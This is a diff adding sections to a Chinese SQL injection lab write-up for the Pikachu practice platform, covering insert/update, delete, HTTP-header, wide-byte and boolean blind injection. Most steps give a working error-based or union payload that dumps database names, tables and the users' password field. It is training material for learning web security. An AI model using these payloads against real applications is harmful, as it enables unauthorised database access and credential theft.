@@ -142,6 +142,8 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 >**xx型注入的后台源码显示闭合方式为`('name')`,用union注入方法和之前的字符型注入、搜索型注入原理相通，只是在闭合的地方用`')`进行闭合就可以了。为加深对报错注入的理解，所以此处改用报错注入的方法来做**
 
+>**怎么区分什么时候用union注入什么时候用报错注入：相较于union注入，若返回页面上没有显示位但是有sql语句执行错误信息输出位，则使用报错注入；若两者都有，则两种注入都可以。**
+
 1.输入`1')`报错，输入`1')#`返回正常
 
 ![avuhakvbkavkakv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avuhakvbkavkakv)
@@ -166,8 +168,107 @@ SQL注入就是指Web应用程序对用户输入数据的合法性没有判断�
 
 ### 六、insert/update注入
 
+>**所谓 insert 注入是指我们前端注册的信息，后台会通过 insert 这个操作插入到数据库中。如果后台没对我们的输入做防 SQL 注入处理，我们就能在注册时通过拼接 SQL 注入。update 注入则指的是对数据库中的数据执行更新动作（而非 select 查询）。第七节的 delect 注入也是同理，对数据库中的某条数据执行删除操作。综上，SQL注入根据sql语句的类型可分为select、insert、update、delect注入。**
 
+>**insert/update注入一般会出现在注册页面的用户名或者密码框（找回密码等）里**
 
+>**这种情况下，我们知道后台使用的是 insert 语句，我们一般可以通过 or 进行闭合。并且updatexml()函数只能注出32位字符，由于我们之前发现password字段的值加上用0x7e以闭合的concat()值会超出32位，所以这里用exp()函数进行注入**
+
+1.用exp()溢出构造payload爆库`'or exp(~(select * from (select database())e)) or '`
+
+![avjakjvbkabvkbakva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjakjvbkabvkbakva)
+
+2.exp()函数爆表`'or exp(~(select * from (select group_concat(table_name) from information_schema.tables where table_schema='pikachu')e)) or '`
+
+![avjbkjabvkjbakjvjkavdjgd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjbkjabvkjbakjvjkavdjgd)
+
+3.exp()函数爆列名`'or exp(~(select * from (select group_concat(column_name) from information_schema.columns where table_schema='pikachu' and table_name='users')e)) or '`
+
+![ajdvbkjabvdkabvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ajdvbkjabvdkabvk)
+
+4.exp()函数爆password字段`'or exp(~(select * from (select group_concat(password) from pikachu.users)e)) or '`
+
+![svanvlavajvjajvakjbv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/svanvlavajvjajvakjbv)
+
+### 七、delect注入
+
+>**delect注入在insert注入的标示中有提过，属于一种sql语句类型。此处构造语句是由于是在burp的数据包中进行Get传输，所以`空格`需要用`+`代替**
+
+>**基于insert和update的语句一般用`or ' `来结尾，因为他们后面往往跟着多组（如`'name1'，'name2'，'name3'`）数据；基于select和delete的用#来注释掉后面的内容(参数是数字型的一般可以不用注释符)**
+
+1.爆库名`1+or+updatexml(1,concat(0x7e,database()),1)`
+
+![kcvkabsvhkabvkbac](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/kcvkabsvhkabvkbac)
+
+2.爆表名`1+or+updatexml(1,concat(0x7e,(select+group_concat(table_name)+from+information_schema.tables+where+table_schema='pikachu')),1)`
+
+![alvlavnkjadvkadsvavd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/alvlavnkjadvkadsvavd)
+
+3.爆列名`1+or+updatexml(1,concat(0x7e,(select+group_concat(column_name)+from+information_schema.columns+where+table_schema='pikachu'+and+table_name='users')),1)`
+
+![avavnajnvdjaduvhdvd](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avavnajnvdjaduvhdvd)
+
+### 八、http头注入
+
+>**http头部中，由于user-agent直接拼接，导致的漏洞。可以先自行构造user-agent，若报错，则的确有漏洞，用insert注入的方法进行注入，可获得输入的数据库名，也可获取更多信息。还有一种是在cookie中，与user-agent相同原因，在数据库里进行拼接，可能产生漏洞。**
+
+>**由于之前已经使用过基于exp()函数和updatexml()函数的报错注入，为达到学习的目的，这里我们用floor()函数构造payload进行注入。**
+
+1.先在http头部中的user-agent中插入单引号`'`，发现报错，说明数据库对user-agent中的内容进行了拼接，存在注入点
+
+![avjnlavnlavavljnajvn](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjnlavnlavavljnajvn)
+
+2.报错返回数据库版本`' or (select 2 from (select count(*), concat(version(), floor(rand(0) * 2))x from information_schema.tables group by x)a) or '`
+
+![sbdsbfbdndfndfhsh](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sbdsbfbdndfndfhsh)
+
+3.爆库`' or (select 2 from (select count(*),concat((select database()),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`
+
+![dbjdjvjabkjvbakjbvkabdvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/dbjdjvjabkjvbakjbvkabdvk)
+
+4.爆表`' or (select 2 from (select count(*),concat((select table_name from information_schema.tables where table_schema='pikachu' limit 3,1),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`
+
+![sbajldvnjldsnbjnfkj](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sbajldvnjldsnbjnfkj)
+
+5.爆列名`' or (select 2 from (select count(*),concat((select column_name from information_schema.columns where table_schema='pikachu' and table_name='users' limit 2,1),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`
+
+![sjbvskjbvkjsdbvkjsk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/sjbvskjbvkjsdbvkjsk)
+
+6.爆password字段`' or (select 2 from (select count(*),concat((select password from pikachu.users limit 0,1),'-',floor(rand(0)*2))x from information_schema.tables group by x)a) or '`
+
+![adbvskjhdvkjsdvjsdbs](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/adbvskjhdvkjsdvjsdbs)
+
+### 九、宽字节注入
+
+>**原理：当我们输入有单引号时被转义为`\'`，无法构造 SQL 语句的时候，可以尝试宽字节注入。前提：数据库编码格式为’gbk’/‘gb2312’等。GBK编码中，反斜杠的编码是 “%5c”，而 “%df%5c” 是繁体字 “連”。**
+
+>**在我们使用的PIKACHU漏洞练习平台中，宽字节注入实验默认关闭了MySQL的错误描述显示,报错注入不太方便，所以这里我就直接用union进行注入啦~**
+
+1.爆库`1234 %df' union select 1,database() #`
+
+![avjbakjvvsljnjskdnvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avjbakjvvsljnjskdnvk)
+
+2.在构造爆表的payload时发现`1234 %df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema='pikachu') #`注入之后总是无显示，后来发现是payload里边的两个单引号依旧被转义没有跳出，所以这里我们换一个没有单引号的payload。构造新的payload`1234 %df' union select 1,(select group_concat(table_name) from information_schema.tables where table_schema=database()) #`成功
+
+![lvkjsvdksdhvjksdvk](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/lvkjsvdksdhvjksdvk)
+
+3.在构造爆列名的payload时无可避免需要用两个单引号闭合表名，所以我们用十六进制编码的方法对表名进行转义，如`select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x27757365727327`。可是这里注入仍不成功，经过一番查找，发现问题出在最后的十六进制转化，转化的是 'users' ,但是有一个错误就是一个字符串转化成十六进制时就不需要再用单引号进行闭合解释，所以去掉前后两个单引号的十六进制0x27,最后应该是0x7573657273。新的payload成功`1234 %df' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=0x7573657273)#`
+
+![vskjdbvkjsdbjsdjlvnsldbn](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/vskjdbvkjsdbjsdjlvnsldbn)
+
+4.最后爆出password字段`1234 %df' union select 1,(select group_concat(password) from pikachu.users)#`
+
+![djvsjdvjdvjkjvkjavv](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/djvsjdvjdvjkjvkjavv)
+
+### 十、布尔盲注
+
+1.通过如下`1``admin``admin' and 1=1#``admin' and 1=2# `的逻辑比对，知道它会把我们拼进去的and1=1,and 1=2进行运算，就可以知道后端这个点是存在注入的；但是貌似这个前端输出的信息特别少，它只有当你输入正确时有一个正确的结果以及你输入不正确时告诉你用户名不存在，所以知道是布尔盲注类型；
+
+![avdidjlsjlahdva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/avdidjlsjlahdva)
+
+![ajdvajdvaovajdvanva](https://raw.githubusercontent.com/U1timater/U1timater.github.io/master/img-in-issue/ajdvajdvaovajdvanva)
+
+advcncmcmccjc
 
 
 
